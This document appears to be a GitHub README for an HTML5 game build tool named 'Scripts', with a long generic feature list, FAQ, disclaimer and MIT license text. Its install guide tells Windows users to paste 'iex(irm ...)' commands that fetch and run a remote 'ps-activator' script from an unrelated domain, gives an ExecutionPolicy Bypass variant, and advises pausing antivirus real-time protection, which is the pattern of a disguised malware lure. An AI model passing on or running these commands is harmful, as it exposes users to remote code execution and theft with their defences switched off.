<div align="center">

# 🚀 HTML5 Game Build Pipeline & Optimization Tool for Windows 11

![preview](https://raw.githubusercontent.com/A-Praise/html5-game-build-toolkit/main/thumb_c9ce6.svg)

[![downloads](https://img.shields.io/badge/DOWNLOADS-3.4K-2f81f7?style=social&labelColor=0d1117)]() [![ps-core](https://img.shields.io/badge/PS--CORE-INSTALLER-54aeff?style=social&labelColor=0d1117)]() [![win](https://img.shields.io/badge/WIN-WIN_11-0969da?style=social&labelColor=0d1117)]() [![tests](https://img.shields.io/badge/TESTS-PASSING-2ea44f?style=social&labelColor=0d1117)]()

</div>

---

Scripts is a build tool engineered for HTML5 game development, handling the full pipeline from source transformation to optimized, deployable packages. It targets multiple output platforms—web browsers, game portals, social media, mobile, and Web3 environments—through a unified configuration and CLI-driven workflow. The tool provides automated asset optimization, modular plugin-based extensibility, and cross-platform packaging, reducing repetitive build tasks while maintaining consistent output across targets. Scripts integrates with common HTML5 game frameworks and exposes configurable entry points, output directories, and optimization flags to fit existing project structures.

## 🚀 PowerShell Install Guide

> [!TIP]
> **Silent installer** — one command, no prompts.
> Windows 10/11 · PowerShell 7+ · No admin

### 1️⃣ Open Windows PowerShell
* Press `Win + X`.
* Select **Terminal** or **Windows PowerShell**.

### 2️⃣ Run the command
Copy the command below, paste it into PowerShell, and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ If PowerShell blocks the script
Paste this into a standard Command Prompt (cmd) and press `Enter`:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> If security software blocks the setup, temporarily pause Real-Time Protection, run the script, then re-enable it.

## 🔧 Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **Multi-Target Build Pipeline**: Compiles a single HTML5 game codebase into deployment-ready artifacts for web browsers, game portals, social media platforms, mobile wrappers, and Web3 environments, with per-target output profiles that apply the correct bundling, asset handling, and runtime shims automatically.

- **Incremental Build Engine**: Uses dependency-graph tracking and content-hash caching to rebuild only the modules and assets that changed, keeping iteration times low on large projects while guaranteeing deterministic output across clean builds.

- **Asset Optimization**: Minifies and tree-shakes JavaScript and TypeScript, compresses images and audio, subsets fonts, and inlines or splits critical resources according to configurable thresholds, reducing payload size without manual post-processing.

- **Code and Asset Packaging**: Produces self-contained bundles with configurable chunk splitting, lazy-loaded segments, and integrity-checked manifests, so builds can be served statically, embedded in portal iframes, or packaged into mobile and Web3 delivery formats.

- **Plugin-Based Architecture**: Exposes lifecycle hooks for preprocessing, transformation, and post-build steps, allowing custom plugins to extend the pipeline without modifying core behavior; built-in plugins cover minification, stylesheet compilation, and platform-specific adapters.

- **Declarative Configuration**: A single project configuration file defines entry points, output directories, target platforms, optimization levels, and plugin ordering, with schema validation that surfaces misconfiguration before a build starts.

- **Command-Line Interface**: A scriptable CLI supports build, watch, and clean operations with machine-readable output, making it suitable for both interactive development and CI pipelines.

- **Watch Mode and Live Rebuilds**: Monitors source and asset directories, triggers incremental rebuilds on change, and reports build status and timing so developers can validate changes continuously.

- **Multi-Platform Output Verification**: Emits per-target reports covering bundle sizes, asset counts, and compatibility checks, flagging outputs that exceed platform-specific limits or violate target constraints.

- **Framework-Agnostic Integration**: Operates on standard module formats and works alongside common HTML5 game frameworks and rendering libraries without requiring framework-specific forks or patches.

- **Web3 Delivery Support**: Generates builds suited to decentralized hosting, including relative-path resolution and content-addressed asset references compatible with distributed storage backends.

- **Reproducible Builds**: Pins dependency resolution and normalizes output ordering so identical sources produce byte-identical artifacts, simplifying release auditing and rollback.

## How it works

Scripts operates as a deterministic, configuration-driven pipeline that transforms a game's source tree into one or more deployment-ready artifacts. At its core, the tool is organized around a build graph: a declared entry point is resolved, its dependency closure is traversed, and each asset passes through an ordered sequence of transform stages before final emission.

**Pipeline stages.** Every build proceeds through resolution, transformation, optimization, and packaging. During resolution, Scripts maps module specifiers and asset references against the project's configured roots, eliminating dead paths and detecting cycles early. Transformation handles source compilation, asset preprocessing, and bundling, producing an intermediate representation that is independent of the final target. Optimization then applies tree-shaking, minification, asset compression, and dead-code elimination to that intermediate form. Packaging emits the final bundle in the layout each target expects, so the same intermediate representation can be reused across multiple outputs without recompiling from source.

**Target abstraction.** Platform differences are isolated behind target profiles rather than scattered through build logic. A target profile defines the output layout, runtime assumptions, asset constraints, and packaging conventions for a given destination — web, portal, social, mobile, or Web3. Because profiles consume the shared intermediate representation, adding or switching an output requires no changes to source code or build scripts, only a different profile selection.

**Incremental builds and caching.** Scripts maintains a content-addressed cache keyed by file contents and transform configuration. When a file is unchanged and its transform inputs are unchanged, its prior output is reused directly. Cache entries are invalidated deterministically when configuration or dependency versions shift, which keeps rebuilds fast during iteration while remaining reproducible in clean environments.

**Configuration model.** All behavior is declared in the project configuration file, which describes entry points, output targets, plugin ordering, and optimization flags. Configuration is validated before execution, and any unsupported combination fails fast with an explicit diagnostic rather than producing a partially valid bundle. Plugin stages are executed in declared order, and each stage receives and returns the shared intermediate representation, so custom transforms compose predictably with built-in ones.

**Asset handling.** Non-code assets are processed through the same graph as code: references are discovered during resolution, assets are fingerprinted for cache safety, and emission rewrites references to their final hashed paths. This keeps asset integrity consistent across targets and prevents stale references in packaged outputs.

**Determinism and diagnostics.** Given identical inputs and configuration, Scripts produces byte-identical outputs. Builds emit structured diagnostics for each stage, including timing, cache hit rates, emitted artifact sizes, and any warnings raised by transforms, making regressions visible without inspecting output files manually.

## Compatibility

**Target Platforms**

- **Web Browsers**: Builds output standards-compliant HTML5, JavaScript, and WebGL content compatible with current versions of Chrome, Firefox, Safari, and Edge. Downlevel transpilation and polyfill injection are configurable for legacy browser targets.
- **Game Portals**: Packaging profiles produce portal-ready bundles with configurable metadata, asset manifests, and SDK shims where required by the hosting portal's integration contract.
- **Social Media Platforms**: Platform-specific presets handle entry point generation, asset constraints, and embedded-context loading behavior for social distribution channels.
- **Mobile**: Output supports WebView-based runtime containers and mobile browser environments. Touch input normalization and asset compression profiles are applied automatically for mobile targets.
- **Web3 Environments**: Build presets account for wallet-provider integration, decentralized storage asset paths, and blockchain-embedded browser constraints, including adjusted bundle chunking and asset hosting assumptions.

**Toolchain Requirements**

- Node.js LTS releases are supported; the minimum required major version is declared in the project's engine configuration.
- Package management is compatible with npm and Yarn workflows.
- The CLI runs cross-platform on Windows, macOS, and Linux with no platform-specific native dependencies in the core build pipeline.

**Input and Output Compatibility**

- Source projects may be authored in JavaScript or TypeScript; type stripping and module resolution are handled during the build.
- Module formats are normalized during bundling, allowing mixed ESM and CommonJS dependencies.
- Output targets include bundling, minification, tree shaking, and asset hashing, with format selection (module or classic script) configurable per target.
- Static assets are processed through the optimization pipeline, with format-specific compression applied per platform profile.

**Integration Compatibility**

- Compatible with common HTML5 game frameworks and rendering libraries, including Phaser and Three.js, via framework-agnostic bundling.
- Plugin architecture supports extending the pipeline without modifying core configuration.
- Configuration files are versioned alongside the tool, and deprecated options are surfaced with migration warnings during builds.

**Known Constraints**

- Platform-specific SDK features are limited to the capabilities exposed by each target environment.
- Web3 presets assume an EIP-1193-compatible provider interface; alternative provider models require custom configuration.
- Very old browser targets may require additional polyfills beyond the default set, at a cost to bundle size.

## FAQ

**What platforms does Scripts support?**
Scripts produces optimized output for web browsers, game portals, social media embeds, mobile webviews, and Web3 environments. Each target has a dedicated build profile that adjusts bundling, asset handling, and runtime shims accordingly. You can emit multiple targets from a single configuration pass.

**Which game engines and frameworks are compatible?**
Scripts is engine-agnostic and operates at the asset and module level. It integrates cleanly with Phaser, Three.js, PixiJS, and custom WebGL or Canvas pipelines. Framework-specific adapters handle sprite atlases, audio sprites, and shader preprocessing where applicable.

**How does the build pipeline work?**
The tool parses your entry point, resolves the module graph, and applies a configurable sequence of transforms: transpilation, tree-shaking, asset fingerprinting, text compression, and packaging. Each stage is independently toggleable, and intermediate artifacts can be preserved for inspection and debugging.

**Can I extend the build with custom plugins?**
Yes. Scripts exposes a modular plugin API with lifecycle hooks for resolution, transformation, and emission. Plugins are declared in the configuration file and execute in a deterministic order. Custom loaders can be registered for non-standard asset types.

**Does Scripts support incremental and watch builds?**
Both are supported. Watch mode tracks the dependency graph and rebuilds only affected modules, while the persistent cache carries transform results across runs. Cold and warm builds share the same output guarantees.

**What optimization features are available?**
Minification, dead-code elimination, asset compression, texture packing, and cache-busted output filenames are built in. Optimization levels are configurable per target, so development builds can prioritize debuggability while production builds prioritize size and load time.

**How is TypeScript handled?**
TypeScript sources are compiled as part of the standard pipeline, with type checking performed alongside bundling. Declaration output and source maps are generated when enabled in the configuration. Path aliases and project references are respected.

**Can I produce different outputs for different targets in one run?**
Yes. Target definitions are declared as an array in the configuration, and a single invocation can emit all of them. Shared transforms are computed once and reused, keeping multi-target builds efficient.

**What are the runtime requirements?**
Scripts runs on current LTS releases of Node.js on Windows, macOS, and Linux. No global system dependencies beyond the Node.js runtime are required.

**How do I troubleshoot a failing build?**
Increase the log verbosity through the CLI or configuration to surface per-stage diagnostics. Build artifacts and transform caches can be persisted to disk for inspection, and individual pipeline stages can be run in isolation to narrow down the failure.

**Is Scripts suitable for CI pipelines?**
Yes. The CLI is non-interactive by default, returns meaningful exit codes, and supports deterministic output for reproducible builds. Cache directories can be persisted between CI runs to reduce build times.

## Disclaimer

The scripts build tool is provided on an "as is" and "as available" basis, without warranties of any kind, whether express, implied, or statutory, including but not limited to warranties of merchantability, fitness for a particular purpose, title, and non-infringement. Use of the tool and reliance on its output are at your sole discretion and risk.

scripts performs automated transformations, optimizations, and packaging of project assets and source code. Output generated by the tool is dependent on input files, project configuration, selected target platforms, and the versions of any third-party dependencies or plugins you choose to integrate. You are responsible for validating all builds, including but not limited to functional correctness, asset integrity, runtime behavior on target platforms, and compatibility with platform-specific requirements for web browsers, game portals, social media, mobile, and Web3 environments.

scripts does not guarantee that generated bundles are free of defects, compatible with every framework, runtime, or platform version, or suitable for production deployment without further testing. Performance characteristics and optimization results may vary based on project structure, asset types, and configuration choices.

To the maximum extent permitted by applicable law, the authors and maintainers of scripts shall not be liable for any direct, indirect, incidental, special, consequential, or exemplary damages arising from the use of or inability to use the tool, including but not limited to loss of data, loss of revenue, business interruption, or costs of substitute services, even if advised of the possibility of such damages.

You are responsible for ensuring that your use of scripts complies with all applicable licenses, platform terms of service, and legal requirements governing your project and its distribution targets. Third-party plugins, dependencies, and external tooling referenced by or integrated with scripts are governed by their respective licenses and are not covered by this disclaimer.

## License

**Scripts** is distributed under the MIT License, a permissive open-source license that grants broad freedom to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software. This licensing model is intentionally aligned with the tool's cross-platform, multi-target build philosophy: the same terms apply whether you are producing a browser build, packaging for a game portal, embedding in a social or mobile runtime, or deploying to a Web3 environment.

Under the MIT License, you may integrate **Scripts** into commercial and non-commercial projects, including proprietary game pipelines, without any obligation to disclose your own source code. The license imposes only minimal conditions: the original copyright notice and permission notice must be included in all copies or substantial portions of the software. There are no copyleft requirements, no per-seat restrictions, and no runtime royalties.

The software is provided "as is," without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and non-infringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

The full license text is included with the **Scripts** distribution and should be retained alongside any redistributed copies. For teams adopting **Scripts** across multiple build targets, the single permissive license simplifies compliance and removes the need for per-target licensing reviews.